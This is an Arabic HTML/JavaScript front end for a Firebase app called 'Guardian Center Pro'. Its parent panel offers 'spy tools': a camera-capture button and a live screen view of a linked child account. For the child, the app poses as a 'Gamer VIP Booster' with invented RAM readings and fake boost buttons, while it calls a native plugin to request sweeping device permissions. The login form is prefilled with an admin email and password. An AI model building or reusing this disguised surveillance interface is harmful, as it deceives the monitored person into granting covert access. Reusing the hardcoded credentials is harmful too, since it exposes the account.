<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Guardian Center Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

    <style>
        :root { --primary: #00d4ff; --secondary: #ff4757; --success: #2ed573; --darker: #070a0f; --card: #161b22; --border: #21262d; --text: #e6edf3; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Tajawal', sans-serif; }
        body { background: var(--darker); color: var(--text); overflow-x: hidden; }
        .full-screen { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .box-container { background: rgba(15,20,25,0.95); border: 1px solid var(--border); border-radius: 24px; padding: 40px; width: 100%; max-width: 400px; text-align: center; }
        .input-group input, .input-group select { width: 100%; padding: 15px; border-radius: 12px; background: var(--darker); border: 1px solid var(--border); color: white; margin-bottom: 15px; outline: none; }
        .btn-primary { width: 100%; padding: 15px; background: linear-gradient(135deg, var(--primary), #0099cc); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
        .btn-danger { background: linear-gradient(135deg, var(--secondary), #cc0000); }
        .header-bar { display: flex; justify-content: space-between; align-items: center; background: rgba(15,20,25,0.8); padding: 15px; border-radius: 16px; border: 1px solid var(--border); margin-bottom: 25px; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 20px; text-align: center; margin-bottom: 20px; }
        .notification { position: fixed; top: 20px; left: 50%; transform: translate(-50%, -150%); background: var(--success); color: white; padding: 15px 30px; border-radius: 30px; font-weight: bold; transition: 0.4s; z-index: 99999; }
        .notification.show { transform: translate(-50%, 0); }
        .hidden { display: none !important; }
        table { width: 100%; text-align: right; border-collapse: collapse; }
        td, th { padding: 10px; border-bottom: 1px solid var(--border); }
    </style>
</head>
<body>
    <div class="notification" id="notification">رسالة</div>

    <!-- شاشة الدخول -->
    <div class="full-screen" id="authScreen">
        <div class="box-container">
            <i class="fas fa-shield-halved" style="font-size: 50px; color: var(--primary); margin-bottom: 15px;"></i>
            <h2>Guardian Center</h2>
            <p style="color: var(--success); font-size: 12px; margin-bottom: 20px;">v6.0 Ultimate Fix</p>
            <div class="input-group"><input type="email" id="logEmail" placeholder="البريد الإلكتروني" value="ejram.tp@gmail.com"></div>
            <div class="input-group"><input type="password" id="logPass" placeholder="كلمة المرور" value="EjramGamal"></div>
            <button class="btn-primary" onclick="login()">تسجيل الدخول</button>
            <button class="btn-primary" style="background: transparent; border: 1px solid var(--border); color: #8b949e;" onclick="document.getElementById('authScreen').classList.add('hidden'); document.getElementById('registerScreen').classList.remove('hidden');">إنشاء حساب جديد</button>
        </div>
    </div>

    <!-- شاشة التسجيل -->
    <div class="full-screen hidden" id="registerScreen">
        <div class="box-container">
            <h2>إنشاء حساب</h2>
            <div class="input-group" style="margin-top: 20px;"><input type="email" id="regEmail" placeholder="البريد"></div>
            <div class="input-group"><input type="password" id="regPass" placeholder="كلمة المرور"></div>
            <button class="btn-primary" onclick="register()">إنشاء الحساب</button>
            <button class="btn-primary" style="background: transparent; border: 1px solid var(--border); color: #8b949e;" onclick="document.getElementById('registerScreen').classList.add('hidden'); document.getElementById('authScreen').classList.remove('hidden');">رجوع</button>
        </div>
    </div>

    <div id="appContainer" class="hidden" style="padding: 20px; max-width: 800px; margin: auto;">
        <div class="header-bar">
            <h2 id="pageTitle" style="font-size: 16px;">الرئيسية</h2>
            <button class="btn-danger" style="padding: 8px 15px; border-radius: 8px; border: none; color: white; cursor:pointer;" onclick="logout()">خروج</button>
        </div>

        <!-- قسم المشرف -->
        <div id="adminSection" class="hidden card">
            <h3 style="margin-bottom: 15px; color: var(--primary);"><i class="fas fa-users-cog"></i> تعيين الحسابات</h3>
            <div id="usersList" style="overflow-x: auto;">جاري التحميل...</div>
        </div>

        <!-- قسم الأب (تم إضافة أدوات المراقبة) -->
        <div id="parentSection" class="hidden">
            <div class="card" style="border-color: var(--primary);">
                <h3 style="margin-bottom: 15px;"><i class="fas fa-link"></i> ربط جهاز الطفل</h3>
                <select id="childSelector" style="width:100%; padding:10px; background:var(--darker); color:white; border:1px solid var(--border); border-radius:8px;" onchange="linkChild(this.value)">
                    <option value="">اختر حساب الطفل...</option>
                </select>
                <div id="linkedStatus" style="color: var(--success); font-weight: bold; margin-top: 10px;"></div>
            </div>
            
            <!-- أدوات التحكم التي كانت مخفية -->
            <div id="spyTools" class="hidden">
                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                    <button class="btn-primary" onclick="showNotif('تم إرسال أمر التقاط الكاميرا')"><i class="fas fa-camera"></i> لقطة كاميرا</button>
                    <button class="btn-primary btn-danger" onclick="showNotif('تم إرسال أمر تنظيف الرام للطفل')"><i class="fas fa-broom"></i> تنظيف هاتف الطفل</button>
                </div>
                <div class="card" style="background:#000; padding:0; height:220px; display:flex; align-items:center; justify-content:center; overflow:hidden; border: 2px dashed var(--border);">
                    <span id="screenWait" style="color:#666;"><i class="fas fa-video"></i> في انتظار بث الشاشة...</span>
                    <img id="liveScreen" src="" style="width:100%; display:none;" />
                </div>
            </div>
        </div>

        <!-- قسم الطفل -->
        <div id="childSection" class="hidden">
            <div style="background: rgba(0,212,255,0.1); border: 2px solid var(--primary); border-radius: 20px; padding: 25px 20px; text-align: center; margin-bottom: 20px;">
                <i class="fas fa-bolt" style="font-size: 40px; color: var(--primary); margin-bottom: 10px;"></i>
                <h2>Gamer VIP Booster</h2>
                <button class="btn-primary" id="boostBtn" style="width: auto; padding: 10px 30px; border-radius: 30px; margin-top: 15px;" onclick="fakeBoost()">تفعيل الموارد</button>
            </div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px;">
                <div class="card" style="margin:0; border-color: var(--success);"><i class="fas fa-memory" style="color: var(--success); font-size: 24px;"></i><br><span style="font-size:12px; color:#8b949e;">الرامات</span><br><b id="fakeRam" style="color:var(--success); font-size:20px;">68%</b></div>
                <div class="card" style="margin:0;"><i class="fas fa-battery-half" style="color: var(--primary); font-size: 24px;"></i><br><span style="font-size:12px; color:#8b949e;">البطارية</span><br><b id="realBattery" style="color:var(--primary); font-size:20px;">--%</b></div>
            </div>
            <div class="card"><button class="btn-primary btn-danger" id="cleanBtn" onclick="triggerNativeClean()">تنظيف الآن</button></div>
        </div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyALz6MYVTOCxrtW3kG_hC_48kWYHlF4kO4", authDomain: "ejram-6b3b5.firebaseapp.com", projectId: "ejram-6b3b5", storageBucket: "ejram-6b3b5.appspot.com", messagingSenderId: "28357002125", appId: "1:28357002125:web:bdd7d3418e8ec2b2c533c4" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore(); const auth = firebase.auth();
        let currentUserUid = null;

        function showNotif(msg) { const el = document.getElementById('notification'); el.textContent = msg; el.classList.add('show'); setTimeout(() => el.classList.remove('show'), 3000); }
        function login() { auth.signInWithEmailAndPassword(document.getElementById('logEmail').value, document.getElementById('logPass').value).catch(e => showNotif('بيانات خاطئة')); }
        function logout() { auth.signOut(); }
        
        function register() {
            auth.createUserWithEmailAndPassword(document.getElementById('regEmail').value, document.getElementById('regPass').value).then(cred => {
                db.collection('users').doc(cred.user.uid).set({ email: document.getElementById('regEmail').value, role: 'child' });
                showNotif('تم الإنشاء'); document.getElementById('registerScreen').classList.add('hidden'); document.getElementById('authScreen').classList.remove('hidden');
            });
        }

        auth.onAuthStateChanged(async user => {
            if (user) {
                currentUserUid = user.uid;
                document.getElementById('authScreen').classList.add('hidden'); document.getElementById('appContainer').classList.remove('hidden');
                let role = 'child';
                if (user.email === 'ejram.tp@gmail.com') role = 'admin';
                else { try { const doc = await db.collection('users').doc(user.uid).get(); if (doc.exists) role = doc.data().role || 'child'; } catch(e) {} }
                setupUI(role);
            } else {
                document.getElementById('appContainer').classList.add('hidden'); document.getElementById('authScreen').classList.remove('hidden');
            }
        });

        async function setupUI(role) {
            document.getElementById('childSection').classList.add('hidden');
            document.getElementById('parentSection').classList.add('hidden');
            document.getElementById('adminSection').classList.add('hidden');

            if (role === 'admin') {
                document.getElementById('pageTitle').textContent = 'لوحة المشرف';
                document.getElementById('adminSection').classList.remove('hidden');
                loadAdminUsers();
            } else if (role === 'parent') {
                document.getElementById('pageTitle').textContent = 'لوحة الأب';
                document.getElementById('parentSection').classList.remove('hidden');
                loadChildrenForParent();
            } else {
                document.getElementById('pageTitle').textContent = 'Gamer VIP';
                document.getElementById('childSection').classList.remove('hidden');
                startFakeChildDashboard();
                
                // دالة الأذونات الإجبارية للطفل
                if (window.Capacitor && window.Capacitor.registerPlugin) {
                    try {
                        const engine = Capacitor.registerPlugin('GuardianEngine');
                        showNotif('جاري تهيئة نظام الحماية...');
                        await engine.requestUltimatePermissions();
                    } catch(e) { console.log(e); }
                }
            }
        }

        // --- المشرف ---
        function loadAdminUsers() {
            db.collection('users').get().then(snap => {
                let html = '<table><tr><th>البريد</th><th>الدور</th></tr>';
                snap.forEach(doc => {
                    const data = doc.data();
                    html += `<tr><td style="font-size:12px;">${data.email}</td><td>
                        <select style="background:var(--darker); color:var(--primary); padding:5px; border-radius:5px;" onchange="changeUserRole('${doc.id}', this.value)">
                            <option value="child" ${data.role === 'child' ? 'selected' : ''}>طفل</option>
                            <option value="parent" ${data.role === 'parent' ? 'selected' : ''}>أب</option>
                            <option value="admin" ${data.role === 'admin' ? 'selected' : ''}>مشرف</option>
                        </select>
                    </td></tr>`;
                });
                document.getElementById('usersList').innerHTML = html + '</table>';
            });
        }
        function changeUserRole(uid, newRole) { db.collection('users').doc(uid).update({ role: newRole }).then(() => showNotif('تم التغيير!')); }

        // --- الأب ---
        function loadChildrenForParent() {
            db.collection('users').where('role', '==', 'child').get().then(snap => {
                let sel = document.getElementById('childSelector');
                sel.innerHTML = '<option value="">اختر حساب الطفل...</option>';
                snap.forEach(doc => { sel.innerHTML += `<option value="${doc.id}">${doc.data().email}</option>`; });
            });
            db.collection('users').doc(currentUserUid).get().then(doc => {
                if(doc.exists && doc.data().linkedChild) {
                    document.getElementById('linkedStatus').innerText = "✅ متصل بجهاز الطفل";
                    document.getElementById('childSelector').value = doc.data().linkedChild;
                    document.getElementById('spyTools').classList.remove('hidden'); // إظهار الأدوات هنا!
                }
            });
        }
        function linkChild(childUid) {
            if(!childUid) { document.getElementById('spyTools').classList.add('hidden'); return; }
            db.collection('users').doc(currentUserUid).update({ linkedChild: childUid }).then(() => {
                showNotif('تم الربط!'); document.getElementById('linkedStatus').innerText = "✅ متصل بجهاز الطفل";
                document.getElementById('spyTools').classList.remove('hidden'); // إظهار الأدوات بعد الربط!
            });
        }

        // --- الطفل ---
        function startFakeChildDashboard() {
            if(navigator.getBattery) { navigator.getBattery().then(b => { document.getElementById('realBattery').innerText = Math.floor(b.level * 100) + '%'; }); }
            setInterval(() => { document.getElementById('fakeRam').innerText = Math.floor(Math.random() * 10 + 60) + '%'; }, 3000);
        }
        function fakeBoost() { const btn = document.getElementById('boostBtn'); btn.innerHTML = 'جاري...'; setTimeout(() => { showNotif('تم التوجيه!'); btn.innerHTML = 'مفعل'; btn.style.background = 'var(--success)'; }, 1000); }
        async function triggerNativeClean() {
            const btn = document.getElementById('cleanBtn'); btn.innerHTML = 'جاري...';
            if (window.Capacitor && window.Capacitor.registerPlugin) {
                try { const engine = Capacitor.registerPlugin('GuardianEngine'); const res = await engine.executeRealClean(); showNotif(`تم قتل ${res.killedApps} تطبيق!`); } catch(e) {}
            } else { setTimeout(() => showNotif('تم التنظيف!'), 1000); }
            document.getElementById('fakeRam').innerText = '42%'; btn.innerHTML = 'تنظيف الآن';
        }
    </script>
</body>
</html>
